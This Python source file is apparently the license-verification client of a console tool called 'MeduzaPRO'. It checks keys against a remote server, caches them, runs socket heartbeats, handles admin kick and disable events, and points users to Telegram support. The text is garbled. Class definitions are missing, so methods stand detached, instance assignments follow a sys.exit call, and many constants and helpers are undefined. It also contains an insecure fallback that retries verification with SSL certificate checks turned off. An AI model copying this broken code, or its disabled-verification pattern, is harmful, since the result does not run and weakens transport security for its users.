from __future__ import annotations
import os
import sys
import time
import json
import uuid
import hashlib
import threading
import platform
import traceback
import itertools
import string
import re
import random
import base64
import ssl
import secrets
import subprocess
import socket
from requests import cookies
import socketio
import webbrowser
import queue
import asyncio
from pathlib import Path
from datetime import datetime, timezone, timedelta
from enum import Enum, auto
from collections import defaultdict
from threading import Lock, Event
from typing import Any, Dict, Optional, Tuple, Union, List, Callable
from urllib.parse import quote_plus, quote, urlsplit, urlparse, parse_qs, parse_qsl, urlencode
import requests
from requests.exceptions import ProxyError, SSLError, ConnectionError, Timeout, HTTPError, TooManyRedirects, ChunkedEncodingError, ContentDecodingError, InvalidURL, InvalidSchema, RequestException
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry
import urllib3
from urllib3.exceptions import InsecureRequestWarning
from colorama import Fore, Style, init
import pyfiglet
from tqdm import tqdm
from faker import Faker
from http.cookiejar import LWPCookieJar, MozillaCookieJar
from requests_toolbelt.multipart.encoder import MultipartEncoder
from concurrent.futures import ThreadPoolExecutor, as_completed
urllib3.disable_warnings(InsecureRequestWarning)
try:
    from fake_useragent import UserAgent
except Exception:
    UserAgent = None
    if not requests:
        os.system('pip install requests requests_toolbelt colorama tqdm pyfiglet faker')
        sys.exit(1)
        init(autoreset=True)
        RESET = '\x1b[0m'
        self.event_type = event_type
        self.message = message
        self.consecutive_failures = consecutive_failures
        self._needs_reauth: Optional[bool] = None
        self._time_since_verify: Optional[float] = None
        self.server_version = server_version
        self.device_count = device_count
        self.max_devices = max_devices
        self.name = name
        self.label = label
        if self.expiry_date and self.expiry_date.tzinfo is None:
            self.expiry_date = self.expiry_date.replace(tzinfo=_TZ_UTC)
            if self.last_verified.tzinfo is None:
                self.last_verified = self.last_verified.replace(tzinfo=_TZ_UTC)


    @property
    def needs_reauth(self) -> bool:
        if self._needs_reauth is None:
            self._needs_reauth = not self.is_valid or self.is_expired or self.status not in ('active', 'pending')
        return self._needs_reauth

    @property
    def time_since_verify(self) -> float:
        if self._time_since_verify is None:
            self._time_since_verify = (datetime.now(_TZ_UTC) - self.last_verified).total_seconds()
        return self._time_since_verify

    def is_newer_than(self, other: Optional['RealtimeLicenseState']) -> bool:
        if other is None:
            return True
        return self.server_version > other.server_version

    def to_dict(self) -> Dict[str, Any]:
        return {'is_valid': self.is_valid, 'status': self.status, 'is_expired': self.is_expired, 'expiry_date': self.expiry_date.isoformat() if self.expiry_date else None, 'last_verified': self.last_verified.isoformat() if self.last_verified else None, 'event_type': self.event_type, 'message': self.message, 'consecutive_failures': self.consecutive_failures, 'server_version': self.server_version, 'device_count': self.device_count, 'max_devices': self.max_devices, 'name': self.name, 'label': self.label, 'needs_reauth': self.needs_reauth}


    def __new__(cls) -> 'LicenseEventBus':
        if cls._instance is None:
            with cls._lock:
                if cls._instance is None:
                    cls._instance = super().__new__(cls)
                    cls._instance._initialized = False
        return cls._instance

    def __init__(self):
        if self._initialized:
            return
        self._initialized = True
        self._subscribers: Dict[str, Callable] = {}
        self._sub_lock = Lock()
        self._event_queue: queue.Queue = queue.Queue()
        self._dispatcher_thread: Optional[threading.Thread] = None
        self._running = False

    def subscribe(self, name: str, callback: Callable) -> None:
        with self._sub_lock:
            self._subscribers[name] = callback

    def unsubscribe(self, name: str) -> None:
        with self._sub_lock:
            self._subscribers.pop(name, None)

    def emit(self, event_type: str, data: Dict[str, Any]) -> None:
        self._event_queue.put((event_type, data))

    def _dispatch_loop(self) -> None:
        while self._running:
            try:
                event_type, data = self._event_queue.get(timeout=0.5)
                with self._sub_lock:
                    for name, callback in list(self._subscribers.items()):
                        try:
                            callback(event_type, data)
                        except Exception:
                            pass
            except queue.Empty:
                continue

    def start(self) -> None:
        if self._running:
            return
        self._running = True
        self._dispatcher_thread = threading.Thread(target=self._dispatch_loop, daemon=True, name='LicenseEventBus')
        self._dispatcher_thread.start()

    def stop(self) -> None:
        self._running = False
        if self._dispatcher_thread:
            self._dispatcher_thread.join(timeout=2)


    def __init__(self, success: bool, error_title: Optional[str]=None, error_message: Optional[str]=None, event_type: Optional[str]=None, license_info: Optional['LicenseInfo']=None, raw_response: Optional[Dict]=None) -> None:
        self.success = success
        self.error_title = error_title
        self.error_message = error_message
        self.event_type = event_type
        self.license_info = license_info
        self.raw_response = raw_response or {}

    def __bool__(self) -> bool:
        return self.success


    def __init__(self, data: Dict[str, Any]) -> None:
        self.id: Optional[int] = data.get('id')
        self.name: str = data.get('name', 'Unknown')
        self.key: Optional[str] = data.get('key')
        self.label: Optional[str] = data.get('label', data.get('product'))
        self.status: str = data.get('status', 'Unknown')
        self.max_devices: int = int(data.get('max_devices', 1))
        self.device_count: int = int(data.get('device_count', 0))
        self._expires_at_raw: Optional[str] = data.get('expires_at') or data.get('expired_at') or ''
        self._parse_expiry()

    def _parse_expiry(self) -> None:
        self.expiry_date: Optional[datetime] = None
        self.expiry_display: str = 'Never'
        self.is_expired: bool = False
        if not self._expires_at_raw:
            return
        parsed_dt: Optional[datetime] = None
        for fmt in ('%Y-%m-%d %H:%M', '%Y-%m-%dT%H:%M:%S', '%Y-%m-%dT%H:%M:%S.%f'):
            try:
                parsed_dt = datetime.strptime(self._expires_at_raw, fmt)
                self.expiry_display = parsed_dt.strftime('%Y-%m-%d %H:%M')
                break
            except ValueError:
                continue
        if parsed_dt is None:
            try:
                parsed_dt = datetime.fromisoformat(self._expires_at_raw.replace('Z', '+00:00'))
                self.expiry_display = parsed_dt.strftime('%Y-%m-%d %H:%M')
            except ValueError:
                self.expiry_display = self._expires_at_raw
                return
        if parsed_dt.tzinfo is None:
            self.expiry_date = parsed_dt.replace(tzinfo=_TZ_UTC)
        else:
            self.expiry_date = parsed_dt.astimezone(_TZ_UTC)
        self.is_expired = self.expiry_date < datetime.now(_TZ_UTC)

    def is_valid(self) -> bool:
        return self.status == 'active' and (not self.is_expired)

    def is_near_expiry(self, hours: int=24) -> bool:
        if self.expiry_date is None:
            return False
        now = datetime.now(_TZ_UTC)
        check_date = self.expiry_date
        if check_date.tzinfo is None:
            check_date = check_date.replace(tzinfo=_TZ_UTC)
        return (check_date - now).total_seconds() < hours * 3600

    def status_color(self) -> str:
        if self.is_expired or self.status == 'expired':
            return LRED
        if self.status == 'disabled':
            return LYELLOW
        if self.is_near_expiry():
            return LYELLOW
        return LGREEN




    def __init__(self) -> None:
        cache_dir = _get_license_cache_dir()
        self.cache_path: Path = cache_dir / 'license.json'
        self._lock = threading.Lock()
        self._device_id: Optional[str] = None

    def _load(self) -> Dict[str, Any]:
        try:
            if not self.cache_path.exists():
                return {}
            with open(self.cache_path, 'r', encoding='utf-8') as f:
                data = json.load(f)
            return data if isinstance(data, dict) else {}
        except (json.JSONDecodeError, OSError):
            return {}

    def _save(self, data: Dict[str, Any]) -> bool:
        try:
            self.cache_path.parent.mkdir(parents=True, exist_ok=True)
            with open(self.cache_path, 'w', encoding='utf-8') as f:
                json.dump(data, f, indent=2)
            return True
        except OSError:
            return False

    def get_device_id(self) -> str:
        if self._device_id:
            return self._device_id
        data = self._load()
        cached = data.get('device_id')
        if cached:
            self._device_id = cached
            return cached
        new_id = _generate_device_id()
        self._save({'device_id': new_id})
        self._device_id = new_id
        return new_id

    def get_license(self) -> Optional[str]:
        data = self._load()
        return data.get('license')

    def save_license(self, key: str, license_info: Optional['LicenseInfo']=None) -> bool:
        with self._lock:
            data = self._load()
            data['license'] = key
            data['device_id'] = self._device_id or self.get_device_id()
            data['cached_at'] = datetime.now(_TZ_UTC).isoformat()
            if license_info:
                data['license_info'] = {'id': license_info.id, 'name': license_info.name, 'key': license_info.key, 'label': license_info.label, 'status': license_info.status, 'max_devices': license_info.max_devices, 'device_count': license_info.device_count, 'expiry_display': license_info.expiry_display, 'expiry_raw': license_info._expires_at_raw}
            return self._save(data)

    def get_cached_license_info(self) -> Optional[Dict[str, Any]]:
        data = self._load()
        return data.get('license_info')

    def is_cache_valid(self, max_age_hours: int=24) -> bool:
        data = self._load()
        cached_at = data.get('cached_at')
        if not cached_at:
            return False
        try:
            cached_dt = datetime.fromisoformat(cached_at.replace('Z', '+00:00'))
            age = datetime.now(_TZ_UTC) - cached_dt
            return age.total_seconds() < max_age_hours * 3600
        except (ValueError, TypeError):
            return False

    def clear_license(self, full_clear: bool=False) -> bool:
        with self._lock:
            device_id = self._load().get('device_id')
            if full_clear:
                new_data: Dict[str, Any] = {'device_id': device_id} if device_id else {}
            else:
                new_data: Dict[str, Any] = {'device_id': device_id} if device_id else {}
            return self._save(new_data)


    def __init__(self, verify_url: str=LICENSE_VERIFY_URL, socket_url: str=LICENSE_SOCKET_URL, label: str=LICENSE_LABEL) -> None:
        self.verify_url = verify_url
        self.socket_url = socket_url
        self.label = label
        self.device_id: Optional[str] = None
        self.license_key: Optional[str] = None
        self.license_info: Optional[LicenseInfo] = None
        self.socket_connected: bool = False
        self.stop_flag = threading.Event()
        self._on_invalid_callback: Optional[Callable[[str, str, str], None]] = None
        self._on_status_callback: Optional[Callable[[LicenseInfo], None]] = None
        self._on_reauth_required: Optional[Callable[[str, str, str], None]] = None
        self._lock = threading.Lock()
        self._state_lock = threading.Lock()
        self._stats_requests = 0
        self._stats_success = 0
        self._stats_kicks = 0
        self._realtime_enabled = False
        self._consecutive_failures = 0
        self._last_verified: Optional[datetime] = None
        self._realtime_state: Optional[RealtimeLicenseState] = None
        self._realtime_thread: Optional[threading.Thread] = None
        self._current_interval = REALTIME_CHECK_INTERVAL
        self._last_server_version: int = 0
        self._version_stable_count: int = 0
        self._last_heartbeat: Optional[datetime] = None
        self._heartbeat_interval: int = 30
        self._heartbeat_thread: Optional[threading.Thread] = None
        self._user_status: UserStatus = UserStatus.LOGGED_OUT
        self._kick_reason: Optional[str] = None
        self.cache = LicenseCache()
        self.device_id = self.cache.get_device_id()
        self._pending_registration = threading.Event()
        self._registration_data: Optional[Dict[str, Optional[str]]] = None
        if SOCKETIO_AVAILABLE:
            self.sio = socketio.Client(reconnection=True, reconnection_attempts=10, reconnection_delay=5)
            self._register_socket_events()
        else:
            self.sio = None
        _license_event_bus.start()
        _license_event_bus.subscribe(f'client_{id(self)}', self._handle_global_event)
        _audit_log('CLIENT_INIT', device_id=self.device_id, result='success')

    def _reset_adaptive_interval(self) -> None:
        self._current_interval = REALTIME_CHECK_INTERVAL
        self._version_stable_count = 0

    def _increase_interval(self) -> None:
        self._current_interval = min(self._current_interval * REALTIME_BACKOFF_MULTIPLIER, REALTIME_MAX_INTERVAL)

    def _on_heartbeat(self) -> None:
        self._last_heartbeat = datetime.now(_TZ_UTC)

    def _check_heartbeat_timeout(self) -> bool:
        if self._last_heartbeat is None:
            return True
        elapsed = (datetime.now(_TZ_UTC) - self._last_heartbeat).total_seconds()
        return elapsed > self._heartbeat_interval * 3

    def get_user_status(self) -> UserStatus:
        with self._lock:
            return self._user_status

    def set_user_status(self, status: UserStatus, reason: Optional[str]=None) -> None:
        with self._lock:
            old_status = self._user_status
            self._user_status = status
            if status == UserStatus.KICKED:
                self._kick_reason = reason
            elif status == UserStatus.ACTIVE:
                self._kick_reason = None
        _audit_log(f'USER_STATUS_CHANGE', device_id=self.device_id, license_key=self.license_key, result='success', message=f"status={status.value}, old_status={old_status.value}, reason={reason or 'N/A'}")

    def get_kick_reason(self) -> Optional[str]:
        with self._lock:
            return self._kick_reason

    def set_on_invalid(self, callback: Callable[[str, str, str], None]) -> 'LicenseClient':
        self._on_invalid_callback = callback
        return self

    def set_on_status(self, callback: Callable[[LicenseInfo], None]) -> 'LicenseClient':
        self._on_status_callback = callback
        return self

    def set_on_reauth_required(self, callback: Callable[[str, str, str], None]) -> 'LicenseClient':
        self._on_reauth_required = callback
        return self

    def _handle_global_event(self, event_type: str, data: Dict[str, Any]) -> None:
        if event_type in LICENSE_INVALID_EVENTS:
            _audit_log('GLOBAL_EVENT_RECEIVED', device_id=self.device_id, event_type=event_type, message=data.get('message', 'N/A'))
            self._trigger_invalidation(event_type, data.get('title', ''), data.get('message', ''))

    def _update_realtime_state(self, state: RealtimeLicenseState) -> None:
        with self._state_lock:
            self._realtime_state = state

    def get_realtime_state(self) -> Optional[RealtimeLicenseState]:
        with self._state_lock:
            return self._realtime_state

    def _trigger_invalidation(self, event_type: str, title: str, message: str) -> None:
        with self._lock:
            if not self.license_key and self._user_status != UserStatus.ACTIVE:
                _audit_log('INVALIDATION_SKIPPED', device_id=self.device_id, event_type=event_type, result='skipped', message='Already not authenticated')
                return
        _audit_log('INVALIDATION_TRIGGERED', device_id=self.device_id, license_key=self.license_key, event_type=event_type, result='success', message=f'title={title}, message={message}')
        kick_reason = event_type
        if event_type in LICENSE_DEVICE_KICK_EVENTS:
            self.set_user_status(UserStatus.KICKED, kick_reason)
        elif event_type in LICENSE_LICENSE_INVALID_EVENTS:
            self.set_user_status(UserStatus.KICKED, kick_reason)
        state = RealtimeLicenseState(is_valid=False, status='invalid', is_expired=True, expiry_date=None, last_verified=datetime.now(_TZ_UTC), event_type=event_type, message=message, consecutive_failures=MAX_CONSECUTIVE_FAILURES)
        self._update_realtime_state(state)
        with self._lock:
            self.license_key = None
            self.license_info = None
            self._stats_kicks += 1
        if event_type in LICENSE_LICENSE_INVALID_EVENTS:
            self.cache.clear_license(full_clear=True)
            _clear_license_file()
            _audit_log('LICENSE_CLEARED', device_id=self.device_id, event_type=event_type, result='success', message='Full license cache cleared')
        else:
            self.cache.clear_license(full_clear=False)
        self.stop_flag.set()
        self._registration_data = None
        self._pending_registration.clear()
        LicenseManager._info = None
        _license_event_bus.emit(event_type, {'title': title, 'message': message, 'device_id': self.device_id, 'timestamp': datetime.now(_TZ_UTC).isoformat()})
        if self._on_invalid_callback:
            try:
                self._on_invalid_callback(event_type, title, message)
            except Exception:
                pass
        _audit_log('INVALIDATION_COMPLETE', device_id=self.device_id, event_type=event_type, result='success', message=f'User status set to {self._user_status.value}')

    def _get_error_info(self, response: Dict[str, Any]) -> Tuple[str, str, str]:
        reason = response.get('reason', '').lower()
        error = response.get('error', '').lower()
        event = response.get('event', '')
        if event in ('device_kicked', 'device_kicked_target'):
            return ('Device Kicked', 'Your device has been disconnected by administrator.', event)
        if event == 'license_disabled':
            return ('License Disabled', 'Your license has been disabled by administrator.', event)
        if event == 'license_deleted':
            return ('License Deleted', 'Your license has been deleted by administrator.', event)
        if event == 'license_expired':
            return ('License Expired', 'Your license has expired. Please renew.', event)
        if event in ('kick_oldest', 'enforce_limit'):
            return ('Device Limit', 'Maximum device limit reached for this license.', event)
        if reason == 'invalid_license' or 'invalid' in reason or 'not found' in error:
            return ('Invalid License', 'The license key you entered is not valid.', 'invalid_license')
        if reason == 'disabled':
            return ('License Disabled', 'Your license has been disabled by administrator.', 'disabled')
        if reason == 'expired':
            return ('License Expired', 'Your license has expired. Please renew your license.', 'expired')
        if 'device' in reason or 'limit' in reason:
            return ('Device Limit', 'Maximum device limit reached for this license.', 'device_limit')
        return ('Verification Failed', response.get('error', 'Verification failed.'), reason or 'unknown')

    def verify(self, license_key: str) -> VerificationResult:
        self._stats_requests += 1
        normalized_key = license_key.strip().upper()
        if not normalized_key:
            return VerificationResult(success=False, error_title='Empty License', error_message='No license key provided.', event_type='empty_key')
        if not re.match('^[A-Z0-9]{4}-[A-Z0-9]{4}-[A-Z0-9]{4}-[A-Z0-9]{4}$', normalized_key):
            return VerificationResult(success=False, error_title='Invalid Format', error_message='License key must be in format XXXX-XXXX-XXXX-XXXX', event_type='invalid_format')
        payload = {'license_key': normalized_key, 'label': self.label, 'device_id': self.device_id or 'UNKNOWN'}
        headers = {'User-Agent': f'MeduzaPRO/{self.device_id}', 'Content-Type': 'application/json', 'Accept': 'application/json'}
        try:
            response = requests.post(self.verify_url, json=payload, headers=headers, timeout=20, verify=True)
            data = response.json() if response.status_code == 200 else {}
        except requests.exceptions.SSLError:
            try:
                response = requests.post(self.verify_url, json=payload, headers=headers, timeout=20, verify=False)
                data = response.json() if response.status_code == 200 else {}
            except Exception:
                return VerificationResult(success=False, error_title='SSL Error', error_message='Secure connection failed. Please check your network.', event_type='ssl_error')
        except requests.exceptions.Timeout:
            return VerificationResult(success=False, error_title='Timeout', error_message='Verification server took too long to respond.', event_type='timeout')
        except requests.exceptions.ConnectionError:
            return VerificationResult(success=False, error_title='Connection Error', error_message='Failed to connect to verification server.', event_type='connection_error')
        except Exception:
            return VerificationResult(success=False, error_title='Connection Error', error_message='Failed to connect to verification server.', event_type='connection_error')
        is_valid = data.get('valid', False)
        if is_valid is True:
            license_data = data.get('license', {})
            info = LicenseInfo(license_data)
            if not info.is_valid():
                return VerificationResult(success=False, error_title='License Expired', error_message='Your license has expired. Please renew.', event_type='license_expired', raw_response=data)
            self._stats_success += 1
            return VerificationResult(success=True, license_info=info, raw_response=data)
        license_data = data.get('license', {})
        if license_data:
            info = LicenseInfo(license_data)
            if info.status == 'expired' or info.is_expired:
                return VerificationResult(success=False, error_title='License Expired', error_message='Your license has expired.', event_type='license_expired', raw_response=data)
        title, message, event_type = self._get_error_info(data)
        return VerificationResult(success=False, error_title=title, error_message=message, event_type=event_type, raw_response=data)

    def _register_socket_events(self) -> None:
        if not self.sio:
            return

        @self.sio.event
        def connect() -> None:
            self.socket_connected = True
            self._last_heartbeat = datetime.now(_TZ_UTC)
            _audit_log('SOCKET_CONNECTED', device_id=self.device_id, license_key=self.license_key, result='success')
            reg_data: Optional[Dict[str, Optional[str]]] = self._registration_data
            if reg_data is None and self.license_key and self.device_id:
                reg_data = {'license_key': self.license_key, 'device_id': self.device_id}
            if reg_data:
                self._registration_data = reg_data
                if self.sio:
                    self.sio.emit('register_device', reg_data)
                    _audit_log('SOCKET_REGISTER', device_id=self.device_id, license_key=self.license_key, result='emitted')
                    self._pending_registration.set()

        @self.sio.event
        def disconnect() -> None:
            self.socket_connected = False
            _audit_log('SOCKET_DISCONNECTED', device_id=self.device_id, license_key=self.license_key, result='success')

        @self.sio.event
        def reconnect() -> None:
            self.socket_connected = True
            self._last_heartbeat = datetime.now(_TZ_UTC)
            _audit_log('SOCKET_RECONNECTED', device_id=self.device_id, license_key=self.license_key, result='success')
            if self.license_key and self.device_id:
                reg_data = {'license_key': self.license_key, 'device_id': self.device_id}
                self.sio.emit('register_device', reg_data)
                self._registration_data = reg_data

        @self.sio.event
        def pong(data: Optional[Dict]=None) -> None:
            self._on_heartbeat()

        def _handle_invalid_event(data: Optional[Dict]=None, event_name: str='') -> None:
            if data is None:
                data = {}
            raw_event = data.get('event', event_name)
            event_type = _normalize_event_name(raw_event) if raw_event else _normalize_event_name(event_name)
            if event_type not in LICENSE_INVALID_EVENTS:
                _audit_log('SOCKET_EVENT_IGNORED', device_id=self.device_id, event_type=event_type, result='ignored', message=f'Event not in invalidation list')
                return
            title, _, _ = self._get_error_info(data)
            message = data.get('info', data.get('message', 'Your session was invalidated.'))
            _audit_log('SOCKET_INVALIDATION', device_id=self.device_id, license_key=self.license_key, event_type=event_type, result='triggered', message=message)
            self._trigger_invalidation(event_type, title, message)
        all_events = list(LICENSE_INVALID_EVENTS)
        for event in all_events:
            try:
                self.sio.on(event, lambda data, e=event: _handle_invalid_event(data, e))
            except Exception as ex:
                _audit_log('SOCKET_REGISTER_ERROR', device_id=self.device_id, event_type=event, result='failed', message=str(ex))

        def _handle_reactivation(data: Optional[Dict]=None, event_name: str='') -> None:
            if data is None:
                data = {}
            event_type = _normalize_event_name(data.get('event', event_name) or event_name)
            _audit_log('SOCKET_REACTIVATION', device_id=self.device_id, license_key=self.license_key, event_type=event_type, result='received', message=data.get('info', 'License reactivated'))
            if self.license_key:
                threading.Thread(target=self._force_verify, daemon=True).start()
        try:
            self.sio.on('license_reactivated', lambda data: _handle_reactivation(data, 'license_reactivated'))
            self.sio.on('LICENSE_REACTIVATED', lambda data: _handle_reactivation(data, 'LICENSE_REACTIVATED'))
        except Exception:
            pass

        @self.sio.on('ping')
        def handle_ping(data: Optional[Dict]=None) -> None:
            if self.sio:
                self.sio.emit('pong', data or {})

    def _force_verify(self) -> None:
        try:
            if self.license_key:
                result = self.verify(self.license_key)
                if result.success and result.license_info:
                    self._reset_adaptive_interval()
                    self._last_verified = datetime.now(_TZ_UTC)
                    state = RealtimeLicenseState(is_valid=True, status='active', is_expired=result.license_info.is_expired, expiry_date=result.license_info.expiry_date, last_verified=self._last_verified, event_type=LicenseEventType.STATUS_UPDATED, message='License verified after reactivation', consecutive_failures=0)
                    self._update_realtime_state(state)
                    if self._on_status_callback:
                        self._on_status_callback(result.license_info)
        except Exception:
            pass

    def login(self) -> Optional[LicenseInfo]:
        file_path = _get_license_file_path()
        print(f'  {LCYAN}[*] Checking for saved license...{RESET_ALL}')
        print(f'  {GRAY}   File: {file_path}{RESET_ALL}')
        saved_license = _load_license_from_file()
        if saved_license is None:
            if file_path.exists():
                print(f'\n  {LYELLOW}[!] License file found but invalid or corrupted{RESET_ALL}')
            else:
                print(f'\n  {LCYAN}[*] No saved license found, please enter manually{RESET_ALL}')
        else:
            license_key, saved_label = saved_license
            print(f'  {GRAY}   Found license: {license_key}{RESET_ALL}')
            print(f'  {GRAY}   Saved label: {saved_label}{RESET_ALL}')
            if _is_valid_license_format(license_key):
                print(f'  {LCYAN}[*] Verifying saved license...{RESET_ALL}')
                result = self.verify(license_key)
                if result.success and result.license_info:
                    info = result.license_info
                    server_label = (info.label or '').strip().upper()
                    file_label = saved_label.strip().upper()
                    print(f'  {GRAY}   Server label: {info.label}{RESET_ALL}')
                    print(f'  {GRAY}   Server label (upper): {server_label}{RESET_ALL}')
                    print(f'  {GRAY}   File label (upper): {file_label}{RESET_ALL}')
                    if server_label == file_label or not saved_label:
                        self._apply_success(info, license_key)
                        _save_license_to_file(license_key, info.label or '')
                        print(f'\n  {LGREEN}[+] Auto-login successful!{RESET_ALL}')
                        print(f'  {LCYAN}[*] Welcome back, {info.name}!{RESET_ALL}')
                        print(f'  {GRAY}   License file: {_get_license_file_path()}{RESET_ALL}')
                        time.sleep(1)
                        return info
                    else:
                        _clear_license_file()
                        self.cache.clear_license()
                        print(f'\n  {LYELLOW}[!] Label mismatch detected{RESET_ALL}')
                        print(f'  {LYELLOW}   Saved label: {saved_label}{RESET_ALL}')
                        print(f'  {LYELLOW}   Server label: {info.label}{RESET_ALL}')
                        print(f'  {LCYAN}[*] Please re-enter your license key{RESET_ALL}')
                        time.sleep(random.uniform(4, 20))
                else:
                    invalid_events = LICENSE_INVALID_EVENTS | {'license_expired', 'invalid_license', 'invalid_format', 'disabled'}
                    event_type = getattr(result, 'event_type', 'unknown')
                    error_msg = getattr(result, 'error_message', 'License invalid or expired')
                    print(f'  {LYELLOW}   Verification failed: {error_msg}{RESET_ALL}')
                    print(f'  {LYELLOW}   Event type: {event_type}{RESET_ALL}')
                    if event_type in invalid_events or not result.success:
                        _clear_license_file()
                        self.cache.clear_license()
                        print(f'\n  {LRED}[!] Saved license is no longer valid{RESET_ALL}')
                        print(f'  {LYELLOW}   {error_msg}{RESET_ALL}')
                        print(f'  {LCYAN}[*] Please re-enter your license key{RESET_ALL}')
                        time.sleep(random.uniform(4, 20))
        cached_key = self.cache.get_license()
        if cached_key:
            result = self.verify(cached_key)
            if result.success and result.license_info:
                self._apply_success(result.license_info, cached_key)
                _save_license_to_file(cached_key, self.license_info.label or '')
                print(f'\n  {LGREEN}[+] Cache login successful!{RESET_ALL}')
                print(f'  {LCYAN}[*] Welcome, {result.license_info.name}!{RESET_ALL}')
                time.sleep(1)
                return result.license_info
            cached_info = self.cache.get_cached_license_info()
            if cached_info and self.cache.is_cache_valid(max_age_hours=24):
                offline_info = LicenseInfo(cached_info)
                if offline_info.is_valid():
                    print(f'\n  {LYELLOW}[!] Using cached license (offline mode){RESET_ALL}')
                    print(f'  {LYELLOW}   Server verification failed, but cache is valid{RESET_ALL}')
                    print()
                    self._apply_success(offline_info, cached_key)
                    return offline_info
            self.cache.clear_license()
        for attempt in range(MAX_LOGIN_ATTEMPTS):
            try:
                os.system('cls' if os.name == 'nt' else 'clear')
                safe_print(banner)
                print(f"  {LCYAN}╔{'═' * 62}╗{RESET_ALL}")
                print(f"  {LCYAN}║{RESET_ALL}{BRIGHT}{CYAN}  LICENSE VERIFICATION{' ' * 30}{RESET_ALL}{LCYAN}║{RESET_ALL}")
                print(f"  {LCYAN}╚{'═' * 62}╝{RESET_ALL}")
                print()
                if attempt > 0:
                    print(f'  {LYELLOW}[!] Attempt {attempt + 1}/{MAX_LOGIN_ATTEMPTS}{RESET_ALL}')
                    print()
                print(f'  {LBLACK}:: Need Help?{RESET_ALL}')
                print(f'     {LCYAN}Telegram: @xqndrs - @xqndrs66{RESET_ALL}')
                print()
                user_input = input(f'  {LCYAN}›{RESET_ALL} License key: ').strip()
                if not user_input:
                    print(f'\n  {LYELLOW}[!] No license key entered{RESET_ALL}')
                    time.sleep(1.5)
                    continue
                print(f'  {LCYAN}[*] Verifying...{RESET_ALL}')
                result = self.verify(user_input)
                if result.success:
                    print()
                    info = result.license_info
                    if info:
                        print(f'  {LGREEN}[+] Welcome, {info.name}!{RESET_ALL}')
                        print(f'  {LCYAN}[+] License: {info.label}{RESET_ALL}')
                        print(f'  {LCYAN}[+] Expires: {info.expiry_display}{RESET_ALL}')
                    print()
                    time.sleep(1)
                    if info:
                        self._apply_success(info, user_input.upper())
                        saved = _save_license_to_file(user_input.upper(), info.label or '')
                        if saved:
                            print(f'  {GRAY}   Auto-login enabled for next run{RESET_ALL}')
                    return info
                else:
                    print()
                    print(f'  {LRED}[!] {result.error_title}{RESET_ALL}')
                    print(f'  {LBLACK}   {result.error_message}{RESET_ALL}')
                    print()
                    if result.event_type in ('invalid_license', 'invalid_format', 'empty_key'):
                        print(f'  {LYELLOW}[*] Opening Telegram support for help...{RESET_ALL}')
                        LicenseClient.open_telegram_support()
                        print()
                    time.sleep(random.uniform(4, 20))
            except KeyboardInterrupt:
                print(f'\n  {LYELLOW}[!] Cancelled{RESET_ALL}')
                return None
            except Exception as e:
                print(f'\n  {LRED}[!] Error: {e}{RESET_ALL}')
                time.sleep(random.uniform(4, 20))
        print(f'\n  {LRED}[!] Too many failed attempts{RESET_ALL}')
        print(f'\n  {LCYAN}[*] Opening Telegram support for assistance...{RESET_ALL}')
        LicenseClient.open_telegram_support()
        return None

    def _apply_success(self, info: LicenseInfo, key: str) -> None:
        with self._lock:
            self.license_key = key
            self.license_info = info
        self.cache.save_license(key, info)
        self._registration_data = {'license_key': key, 'device_id': self.device_id}

    @staticmethod
    def open_telegram_support() -> bool:
        try:
            print(f'\n  {LCYAN}[*] Opening Telegram support...{RESET_ALL}')
            webbrowser.open(TELEGRAM_SUPPORT_URL, new=2, autoraise=True)
            return True
        except Exception as e:
            print(f'  {LRED}[!] Failed to open browser: {e}{RESET_ALL}')
            print(f'  {LWHITE}   Please visit manually: {TELEGRAM_SUPPORT_URL}{RESET_ALL}')
            return False

    def start_protection(self, enable_realtime: bool=True) -> 'LicenseClient':
        if not self.sio:
            return self
        self.stop_flag.clear()
        self._realtime_enabled = enable_realtime
        self._reset_adaptive_interval()
        self._last_server_version = 0
        self._version_stable_count = 0
        threading.Thread(target=self._socket_manager, daemon=True, name='socket_manager').start()
        threading.Thread(target=self._status_check_loop, daemon=True, name='status_check').start()
        if enable_realtime:
            self._realtime_thread = threading.Thread(target=self._realtime_verification_loop, daemon=True, name='realtime_license_check')
            self._realtime_thread.start()
        self._heartbeat_thread = threading.Thread(target=self._heartbeat_loop, daemon=True, name='heartbeat')
        self._heartbeat_thread.start()
        return self

    def _socket_manager(self) -> None:
        while not self.stop_flag.is_set():
            try:
                if not self.socket_connected and self.sio:
                    _audit_log('SOCKET_CONNECTING', device_id=self.device_id, license_key=self.license_key, result='initiated')
                    self.sio.connect(self.socket_url, wait=True, wait_timeout=30)
                    self.socket_connected = True
                    _audit_log('SOCKET_CONNECTED', device_id=self.device_id, license_key=self.license_key, result='success')
            except Exception as e:
                self.socket_connected = False
                _audit_log('SOCKET_CONNECT_ERROR', device_id=self.device_id, license_key=self.license_key, result='failed', message=str(e))
            if not self.stop_flag.is_set():
                time.sleep(5)

    def _heartbeat_loop(self) -> None:
        while not self.stop_flag.is_set():
            try:
                time.sleep(self._heartbeat_interval)
                if not self.socket_connected or not self.sio:
                    continue
                try:
                    self.sio.emit('ping', {'timestamp': int(time.time())})
                except Exception:
                    pass
                if self._check_heartbeat_timeout():
                    _audit_log('HEARTBEAT_TIMEOUT', device_id=self.device_id, license_key=self.license_key, result='timeout', message='Socket may be stale')
            except Exception:
                pass

    def _realtime_verification_loop(self) -> None:
        while not self.stop_flag.is_set() and self._realtime_enabled:
            try:
                time.sleep(self._current_interval)
            except Exception:
                time.sleep(REALTIME_CHECK_INTERVAL)
            with self._lock:
                if not self.license_key:
                    continue
            try:
                result = self.verify(self.license_key)
                if result.success and result.license_info:
                    self._last_verified = datetime.now(_TZ_UTC)
                    server_version = 0
                    raw = getattr(result, 'raw_response', {})
                    if raw:
                        server_version = raw.get('_v', 0) or 0
                        lic_data = raw.get('license', {})
                        if lic_data:
                            server_version = lic_data.get('_v', server_version) or server_version
                    version_changed = server_version != self._last_server_version
                    if version_changed:
                        self._last_server_version = server_version
                        self._version_stable_count = 0
                        self._reset_adaptive_interval()
                    else:
                        self._version_stable_count += 1
                        if self._version_stable_count >= 5:
                            self._increase_interval()
                    self._consecutive_failures = 0
                    state = RealtimeLicenseState(is_valid=True, status='active', is_expired=result.license_info.is_expired, expiry_date=result.license_info.expiry_date, last_verified=self._last_verified, event_type=LicenseEventType.STATUS_UPDATED, message='License verified', consecutive_failures=0, server_version=server_version, device_count=result.license_info.device_count, max_devices=result.license_info.max_devices, name=result.license_info.name, label=result.license_info.label)
                    self._update_realtime_state(state)
                    with self._lock:
                        self.license_info = result.license_info
